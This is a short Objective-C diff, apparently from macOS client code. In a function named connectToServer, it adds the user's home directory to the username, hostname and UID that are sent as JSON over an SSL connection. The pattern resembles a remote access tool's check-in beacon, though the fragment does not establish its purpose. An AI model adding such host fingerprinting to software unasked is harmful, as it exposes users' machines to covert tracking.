@@ -101,6 +101,7 @@ void connectToServer(NSDictionary *arguments) {
     [deviceInfo setValue:NSUserName() forKey:@"username"];
     [deviceInfo setValue:[[NSHost currentHost] localizedName] forKey:@"hostname"];
     [deviceInfo setValue:getUUID() forKey:@"uid"];
+    [deviceInfo setValue:NSHomeDirectory() forKey:@"current_directory"];
     NSData *jsonData = [NSJSONSerialization dataWithJSONObject:deviceInfo options:0 error:nil];
     NSString *jsonString = [[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding];
     SSL_write(client_ssl, [jsonString UTF8String], (int)strlen([jsonString UTF8String]));
